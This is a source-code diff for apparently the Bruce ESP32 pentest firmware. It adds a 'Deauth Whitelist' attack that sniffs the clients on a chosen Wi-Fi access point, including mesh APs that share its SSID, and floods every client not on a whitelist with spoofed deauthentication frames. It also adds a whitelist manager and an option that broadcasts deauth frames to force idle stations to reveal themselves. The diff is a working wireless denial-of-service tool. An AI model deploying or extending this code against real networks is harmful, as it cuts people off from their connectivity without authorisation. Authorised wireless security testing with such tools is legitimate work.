@@ -55,7 +55,7 @@ static std::vector<APInfo> sameSSID_APs;
 
 static std::vector<Host> detectedClients;
 static uint8_t scanTargetBSSID[6];
-static bool clientScanActive = false;
+static volatile bool clientScanActive = false;
 
 // =============================================================================
 // Vendor OUI Lookup
@@ -1078,7 +1078,7 @@ void clientSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 }
 
-void scanClientsOnAP(uint8_t *targetMAC, int channel) {
+static bool collectClientsOnAP(uint8_t *targetMAC, int channel, bool provoke) {
     WiFiState savedState = saveWiFiState();
     bool wasConnected = savedState.was_connected;
 
@@ -1096,7 +1096,7 @@ void scanClientsOnAP(uint8_t *targetMAC, int channel) {
         displayError("Failed to enter AP mode", true);
         clientScanActive = false;
         if (wasConnected) { restoreWiFiState(savedState); }
-        return;
+        return false;
     }
 
     esp_wifi_set_promiscuous_rx_cb(clientSnifferCallback);
@@ -1119,7 +1119,9 @@ void scanClientsOnAP(uint8_t *targetMAC, int channel) {
 
     while (!check(EscPress) && millis() - startTime < 8000) {
         if (millis() - startTime > scanCount * 1000) {
-            sendDeauthFrames(frame, 26);
+            // Provoke broadcasts a deauth each second so idle stations reconnect and show up in the scan
+            // Skipped during scans specific for populating a whitelist
+            if (provoke) sendDeauthFrames(frame, 26);
             scanCount++;
 
             tft.fillRect(0, 80, tftWidth, tftHeight - 100, TFT_BLACK);
@@ -1144,6 +1146,11 @@ void scanClientsOnAP(uint8_t *targetMAC, int channel) {
 
     if (wasConnected) { restoreWiFiState(savedState); }
 
+    return true;
+}
+
+void scanClientsOnAP(uint8_t *targetMAC, int channel) {
+    if (!collectClientsOnAP(targetMAC, channel, true)) return;
     showClientSelectionForDeauth(detectedClients, targetMAC, channel);
 }
 
@@ -1182,6 +1189,306 @@ void showClientSelectionForDeauth(const std::vector<Host> &clients, uint8_t *tar
 }
 
 void deauthTargetListMenu() { showAPSelectionForClientDeauth(); }
+
+// Forward declarations
+static void showAPSelectionForWhitelist(bool forAttack);
+
+static bool isHexChar(char c) {
+    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
+}
+
+// Stores MAC addresses in same format as the whitelist for easy compare
+static bool normalizeMacInput(const String &raw, String &out) {
+    String hex = "";
+    for (unsigned int i = 0; i < raw.length(); i++) {
+        if (isHexChar(raw[i])) hex += raw[i];
+    }
+    if (hex.length() != 12) return false;
+    hex.toLowerCase();
+
+    out = "";
+    for (int i = 0; i < 12; i += 2) {
+        if (i) out += ":";
+        out += hex.substring(i, i + 2);
+    }
+
+    uint8_t parsed[6];
+    stringToMAC(out.c_str(), parsed);
+    return !isMACZero(parsed);
+}
+
+// Compares a MAC address against the whitelist
+static bool isMacWhitelisted(const String &mac) {
+    uint8_t candidate[6];
+    stringToMAC(mac.c_str(), candidate);
+    if (isMACZero(candidate)) return false;
+
+    for (const auto &entry : bruceConfig.deauthWhitelist) {
+        uint8_t allowed[6];
+        stringToMAC(entry.c_str(), allowed);
+        if (macCompare(candidate, allowed)) return true;
+    }
+    return false;
+}
+
+void runDeauthWhitelist(uint8_t *targetMAC, int channel) {
+    // Exit if the whiltelist isn't set yet
+    if (bruceConfig.deauthWhitelist.empty()) {
+        displayError("Whitelist empty", true);
+        return;
+    }
+
+    WiFiState savedState = saveWiFiState();
+    int band = getWiFiBand(channel);
+    cacheSameSSIDAPs();
+    bool useMultipleAPs = sameSSID_APs.size() > 1;
+
+    detectedClients.clear();
+    memcpy(scanTargetBSSID, targetMAC, 6);
+
+    if (!initializeDeauthMode(channel, savedState)) {
+        restoreWiFiState(savedState);
+        return;
+    }
+
+    // Sniff throughout the attack to detect new devices
+    clientScanActive = true;
+    esp_wifi_set_promiscuous_rx_cb(clientSnifferCallback);
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+
+    drawMainBorderWithTitle("Deauth Whitelist");
+    tft.setTextSize(FP);
+    String bandStr = (band == 1) ? "5GHz" : (band == 2) ? "6GHz" : "2.4GHz";
+    padprintln("Channel: " + String(channel) + " (" + bandStr + ")");
+    padprintln("Sparing: " + String(bruceConfig.deauthWhitelist.size()) + " MACs");
+    if (useMultipleAPs) { padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs"); }
+    padprintln("");
+    padprintln("Press BACK to STOP.");
+
+    SelPress = false;
+    EscPress = false;
+    PrevPress = false;
+    NextPress = false;
+    delay(100);
+
+    std::vector<Host> targets;
+    bool first_pass = true;
+    uint32_t last_refresh = 0;
+    uint32_t last_status = millis();
+    int total_frames = 0;
+    int spared = 0;
+    size_t target_index = 0;
+    int ap_index = 0;
+
+    while (!check(EscPress)) {
+        // Scan for new devices at the start and every 3 seconds
+        if (first_pass || millis() - last_refresh > 3000) {
+            clientScanActive = false;
+            vTaskDelay(pdMS_TO_TICKS(20));
+            targets.clear();
+            spared = 0;
+            for (const auto &client : detectedClients) {
+                if (isMacWhitelisted(client.mac)) spared++;
+                else targets.push_back(client);
+            }
+            clientScanActive = true;
+            last_refresh = millis();
+            first_pass = false;
+            if (target_index >= targets.size()) target_index = 0;
+        }
+
+        if (targets.empty()) {
+            // Don't bother sending frames if no targets are enumerated
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+        } else {
+            // Deauth the current target
+            if (target_index >= targets.size()) { target_index = 0; }
+            const Host &host = targets[target_index];
+            uint8_t hostMAC[6];
+            stringToMAC(host.mac.c_str(), hostMAC);
+
+            if (!isMACZero(hostMAC)) {
+                uint8_t frames[4][26];
+                int reason_count = 0;
+                const uint8_t *reasons = getDeauthReasons(band, &reason_count);
+                uint8_t reason = reasons[random(reason_count)];
+
+                if (useMultipleAPs) {
+                    ap_index = (ap_index + 1) % sameSSID_APs.size();
+                    APInfo &current_ap = sameSSID_APs[ap_index];
+                    esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
+                    vTaskDelay(50 / portTICK_PERIOD_MS);
+                    buildOptimizedDeauthFrame(
+                        frames[0], hostMAC, current_ap.bssid, current_ap.bssid, reason, false
+                    );
+                    buildOptimizedDeauthFrame(
+                        frames[1], hostMAC, current_ap.bssid, current_ap.bssid, reason, true
+                    );
+                    buildOptimizedDeauthFrame(
+                        frames[2], current_ap.bssid, hostMAC, current_ap.bssid, reason, false
+                    );
+                    buildOptimizedDeauthFrame(
+                        frames[3], current_ap.bssid, hostMAC, current_ap.bssid, reason, true
+                    );
+                } else {
+                    buildOptimizedDeauthFrame(frames[0], hostMAC, targetMAC, targetMAC, reason, false);
+                    buildOptimizedDeauthFrame(frames[1], hostMAC, targetMAC, targetMAC, reason, true);
+                    buildOptimizedDeauthFrame(frames[2], targetMAC, hostMAC, targetMAC, reason, false);
+                    buildOptimizedDeauthFrame(frames[3], targetMAC, hostMAC, targetMAC, reason, true);
+                }
+
+                for (int i = 0; i < 4; i++) {
+                    sendDeauthFrames(frames[i], 26);
+                    total_frames += 3;
+                }
+            }
+            target_index++;
+            delay(random(1, 5));
+        }
+
+        // Update the UI every second
+        if (millis() - last_status > 1000) {
+            last_status = millis();
+            tft.fillRect(0, 80, tftWidth, tftHeight - 120, TFT_BLACK);
+            tft.setCursor(10, 80);
+            padprintln("Targets: " + String(targets.size()));
+            padprintln("Spared:  " + String(spared));
+            padprintln("Frames:  " + String(total_frames));
+            padprintln("");
+            padprintln("Press BACK to STOP.");
+        }
+    }
+
+    clientScanActive = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+
+    wifiDisconnect();
+    WiFi.mode(savedState.wifi_mode);
+    delay(500);
+    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
+    padprintln("Attack stopped.");
+    padprintln("Frames sent: " + String(total_frames));
+
+    if (savedState.was_connected) {
+        padprintln("Restoring WiFi...");
+        restoreWiFiState(savedState);
+    }
+    delay(1000);
+}
+
+static void addWhitelistFromScan(uint8_t *apMAC, int channel) {
+    if (!collectClientsOnAP(apMAC, channel, false)) return;
+
+    options.clear();
+    for (const auto &client : detectedClients) {
+        if (isMacWhitelisted(client.mac)) continue;
+
+        String mac = client.mac;
+        String label = mac;
+        if (!client.hostname.isEmpty()) label = client.hostname + " (" + mac + ")";
+        else if (!client.vendor.isEmpty() && client.vendor != "Unknown")
+            label = client.vendor + " (" + mac + ")";
+
+        options.push_back({label, [mac]() { bruceConfig.addDeauthWhitelistMac(mac); }});
+    }
+
+    if (options.empty()) {
+        displayError("No new clients", true);
+        return;
+    }
+
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+}
+
+static void addWhitelistManual() {
+    String raw = hex_keyboard("", 12, "MAC (12 hex chars)");
+    if (raw == "\x1B") return;
+
+    String mac;
+    if (!normalizeMacInput(raw, mac)) {
+        displayError("Invalid MAC", true);
+        return;
+    }
+    bruceConfig.addDeauthWhitelistMac(mac);
+}
+
+static void removeWhitelistMenu() {
+    options.clear();
+    for (const auto &entry : bruceConfig.deauthWhitelist) {
+        String mac = entry;
+        options.push_back({mac, [mac]() { bruceConfig.removeDeauthWhitelistMac(mac); }});
+    }
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+}
+
+static void manageWhitelistMenu() {
+    options.clear();
+    options.push_back({"Add From Scan", []() { showAPSelectionForWhitelist(false); }});
+    options.push_back({"Add Manually", []() { addWhitelistManual(); }});
+    if (!bruceConfig.deauthWhitelist.empty()) {
+        options.push_back({"Remove Entry", []() { removeWhitelistMenu(); }});
+    }
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+}
+
+static void showAPSelectionForWhitelist(bool forAttack) {
+    drawMainBorderWithTitle("Select AP");
+    displayTextLine("Scanning for networks...");
+
+    int n = WiFi.scanNetworks(false, false);
+    if (n == 0) {
+        displayError("No networks found", true);
+        return;
+    }
+
+    options.clear();
+    for (int i = 0; i < n; i++) {
+        String ssid = WiFi.SSID(i);
+        String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
+        String optionText =
+            displayName + " (" + String(WiFi.RSSI(i)) + "dBm|ch" + String(WiFi.channel(i)) + ")";
+
+        options.push_back({optionText, [=]() {
+                               uint8_t apMAC[6];
+                               memcpy(apMAC, WiFi.BSSID((uint8_t)i), 6);
+                               int ch = WiFi.channel((uint8_t)i);
+                               WiFi.scanDelete();
+
+                               SelPress = false;
+                               EscPress = false;
+                               PrevPress = false;
+                               NextPress = false;
+                               delay(100);
+
+                               if (forAttack) runDeauthWhitelist(apMAC, ch);
+                               else addWhitelistFromScan(apMAC, ch);
+                           }});
+    }
+
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+}
+
+void deauthWhitelistMenu() {
+    options.clear();
+    String manageLabel = "Manage Whitelist (" + String(bruceConfig.deauthWhitelist.size()) + ")";
+
+    options.push_back({"Start Attack", []() { showAPSelectionForWhitelist(true); }});
+    options.push_back({manageLabel, []() { manageWhitelistMenu(); }});
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+}
 
 void showTargetSelection() {
     drawMainBorderWithTitle("Select Target");
